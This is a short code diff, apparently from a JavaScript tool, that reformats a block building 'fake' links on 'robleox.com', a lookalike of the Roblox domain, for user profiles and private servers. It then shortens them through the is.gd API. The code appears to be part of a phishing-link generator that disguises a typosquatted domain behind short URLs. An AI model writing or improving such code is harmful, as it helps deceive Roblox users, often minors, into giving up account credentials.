@@ -35,14 +35,12 @@
     }
 
     let fakeURL = '';
-   if (type === 'profile') {
-  fakeURL = `https://www.robleox.com/users/${id}/profile`;
-} else if (type === 'privateServer') {
-  fakeURL = `https://www.robleox.com/games/${id}/Private-Server`;
-}
+    if (type === 'profile') {
+      fakeURL = `https://www.robleox.com/users/${id}/profile`;
+    } else if (type === 'privateServer') {
+      fakeURL = `https://www.robleox.com/games/${id}/Private-Server`;
+    }
 
-
-    // Use is.gd API to shorten URL
     try {
       const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(fakeURL)}`);
       if (!response.ok) throw new Error('Failed to shorten URL');
